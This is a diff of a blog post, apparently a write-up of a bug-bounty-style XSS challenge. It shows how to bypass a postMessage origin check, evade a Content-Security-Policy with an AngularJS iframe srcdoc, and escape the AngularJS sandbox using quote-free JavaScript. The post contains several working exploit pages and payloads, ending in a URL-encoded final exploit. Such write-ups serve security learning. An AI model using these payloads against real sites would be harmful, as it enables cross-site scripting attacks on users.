@@ -21,7 +21,9 @@ Good luck!
 When dealing with XSS challenges the very first step is to find some attacker-controllable input that can be used as a vector to exploit the actual XSS.  
 This task is particularly easy in this challenge as the buggy calculator uses an `iframe` as calculator display and sends content updates through the `window.postMessage()` API.
 **frame.html**
-```html
+
+{% highlight html%}
+{% raw %}
 <!DOCTYPE html>
 <html>
     <head>
@@ -46,9 +48,13 @@ This task is particularly easy in this challenge as the buggy calculator uses an
         0
     </body>
 </html>
-```
+{% endraw %}
+{% endhighlight %}
+
 **frame.js**
-```javascript
+
+{% highlight javascript%}
+{% raw %}
 window.addEventListener("message", receiveMessage, false);
 
 function receiveMessage(event) {
@@ -68,7 +74,8 @@ function receiveMessage(event) {
         document.body.innerHTML=msg;
     }
 }
-```
+{% endraw %}
+{% endhighlight %}
 
 ### How postMessage works? ###
 
@@ -88,15 +95,18 @@ Following the documentation we can understand that on the recipient `Window` mes
 Knowing that we can send messages with the `window.postMessage()` API we should check what the `EventListener` does.  
 
 First it checks that the `origin` of the message is compliant to a specific RegEx:
-```javascript
+{% highlight javascript%}
+{% raw %}
     if (!/^http:\/\/calc.buggywebsite.com/.test(event.origin)) {
         return
     }
-```
+{% endraw %}
+{% endhighlight %}
 
 Then it checks if the content of the message is `on` or `off` to turn on or off the display and finally if it's different from the previous 2 cases it adds its content to the page via the `innerHTML` API (which would give us `HTML` injection as threats strings as trusted `HTML` code) given the fact that the input does not contain the character `'` and the character `&`.  
 
-```javascript
+{% highlight javascript%}
+{% raw %}
     // display message 
     msg = event.data;
     if (msg == 'off') {
@@ -106,7 +116,8 @@ Then it checks if the content of the message is `on` or `off` to turn on or off 
     } else if (!msg.includes("'") && !msg.includes("&")) {
         document.body.innerHTML=msg;
     }
-```
+{% endraw %}
+{% endhighlight %}
 
 ### Bypassing the event.origin check ###
 
@@ -119,8 +130,8 @@ Of course! Anyone could create a subdomain which starts with `calc.buggywebsite.
 That's not a big deal online services like [xip.io](https://xip.io) could be used to quickly reproduce this locally (i.e. `http://calc.buggywebsite.com.127.0.0.1.xip.io:8000/` could be used to point to a local `HTTP` server on port `8000` with a domain which bypasses the check). Moreover, while submitting the final PoC through [BugPoc.com](https://bugpoc.com) I realized that it also allows us to change the subdomain of the PoC!
 
 Given the aforementioned bypass, we can use our desired trick to host the following HTLM page, which embeds `http://calc.buggywebsite.com/frame.html` in an iframe and sends a message to it containing `test`.
-
-```html
+{% highlight html%}
+{% raw %}
 <iframe src="http://calc.buggywebsite.com/frame.html" name="target"></iframe>
 <script>
     win = window.frames.target;
@@ -128,7 +139,8 @@ Given the aforementioned bypass, we can use our desired trick to host the follow
         window.frames.target.postMessage("test","http://calc.buggywebsite.com/");
     }, 1000);
 </script>
-```
+{% endraw %}
+{% endhighlight %}
 
 ![PoC creation on BugPoc]({{ site.url }}/assets/BugPoc/BugPoc-1.JPG)
 
@@ -142,9 +154,11 @@ So now we have our working exploit to the HTML injection, we just need to send a
 
 Not so fast, as can be seen the the `frame.html` `<head>` section a `<meta>` tag declaring a [Content-Security-Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP) is present.
 
-```html
+{% highlight html%}
+{% raw %}
 <meta http-equiv="Content-Security-Policy" content="script-src 'unsafe-eval' 'self'; object-src 'none'">
-```
+{% endraw %}
+{% endhighlight %}
 
 ### CSP analysis ###
 
@@ -164,7 +178,8 @@ Unfortunately, we don't have AngularJS loaded in the `/frame.html` page, but we 
 *What about creating a full new document?*
 Yeah, that's the way! We can inject an `iframe` inside the `iframe` and set an arbitrary `HTML` content via the `srcdoc` attribute!
 
-```html
+{% highlight html%}
+{% raw %}
 <iframe src="http://calc.buggywebsite.com/frame.html" name="target"></iframe>
 <script>
     win = window.frames.target;
@@ -172,7 +187,8 @@ Yeah, that's the way! We can inject an `iframe` inside the `iframe` and set an a
         window.frames.target.postMessage('\u003ciframe srcdoc="\u003cscript src=/angular.min.js\u003E\u003c/script\u003e\u003cdiv ng-app\u003e{{6*7}}\u003c/div\u003E"\u003E\u003c/iframe\u003E',"http://calc.buggywebsite.com/");
     }, 1000);
 </script>
-```
+{% endraw %}
+{% endhighlight %}
 
 ![AngularJS injection]({{ site.url }}/assets/BugPoc/BugPoc-4.JPG)
 
@@ -182,9 +198,11 @@ Yeah, that's the way! We can inject an `iframe` inside the `iframe` and set an a
 AngularJS from version 1.0 to version 1.5.9 has a sandbox, which [was removed in version 1.6](http://blog.angularjs.org/2016/09/angular-16-expression-sandbox-removal.html). The idea of the sandbox was to prevent attackers able to inject AngularJS code to automatically obtain arbitrary JavaScript injection. After an [infinite list of bypasses](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/XSS%20in%20Angular.md) the AngularJS team just removed the sandbox. 🤷🏾‍♂️
 
 Fortunately for us a known sandbox escape for version 1.5.6 is available:
-```javascript
+{% highlight javascript%}
+{% raw %}
 {{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(1)');}}
-```
+{% endraw %}
+{% endhighlight %}
 
 Unfortunately for us, we can't use single quotes and we can't even use the common `srcdoc` trick to encode characters in `HTML entities` as the `&` character is blacklisted.
 
@@ -193,19 +211,24 @@ The only option is to use some `JavaScript-fu` and refactor the code not to use 
 The first step is to create a dict having as key a `String` and as value the `prototype` of the `constructor` of a `String`.
 In JavaScript, we can create an empty string with `([]+[])` (stolen from [JSFuck](https://github.com/aemkei/jsfuck/blob/master/jsfuck.js#L20)) allowing us to easily rewrite the first part of the sandbox escape without `'` and `&`.
 
-```javascript
+{% highlight javascript%}
+{% raw %}
 x = {}; x[([]+[])]=([]+[]).constructor.prototype; x[([]+[])].charAt=[].join;
-```
+{% endraw %}
+{% endhighlight %}
 
 For the second part, we can retrieve from the `String` `constructor` the `fromCharCode()` function and create a string out of the `ASCII` representation of characters.
 
-```javascript
+{% highlight javascript%}
+{% raw %}
 $eval(x[([]+[])].constructor.fromCharCode(120,61,97,108,101,114,116,40,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,41));
-```
+{% endraw %}
+{% endhighlight %}
 
 Wrapping everything together we have our final exploit
 
-```html
+{% highlight html%}
+{% raw %}
 <iframe src="http://calc.buggywebsite.com/frame.html" name="target"></iframe>
 <script>
     win = window.frames.target;
@@ -213,7 +236,8 @@ Wrapping everything together we have our final exploit
         window.frames.target.postMessage(unescape('%3Ciframe%20srcdoc%3D%22%3Cscript%20src%3D/angular.min.js%3E%3C/script%3E%3Cdiv%20ng-app%3E%7B%7B%20x%20%3D%20%7B%7D%3B%20x%5B%28%5B%5D+%5B%5D%29%5D%3D%28%5B%5D+%5B%5D%29.constructor.prototype%3B%20x%5B%28%5B%5D+%5B%5D%29%5D.charAt%3D%5B%5D.join%3B%24eval%28x%5B%28%5B%5D+%5B%5D%29%5D.constructor.fromCharCode%28120%2C61%2C97%2C108%2C101%2C114%2C116%2C40%2C100%2C111%2C99%2C117%2C109%2C101%2C110%2C116%2C46%2C100%2C111%2C109%2C97%2C105%2C110%2C41%29%29%3B%7D%7D%3C/div%3E%22%3E%3C/iframe%3E'),"http://calc.buggywebsite.com/");
     }, 1000);
 </script>
-```
+{% endraw %}
+{% endhighlight %}
 
 ![Final exploit]({{ site.url }}/assets/BugPoc/BugPoc-5.JPG)
 
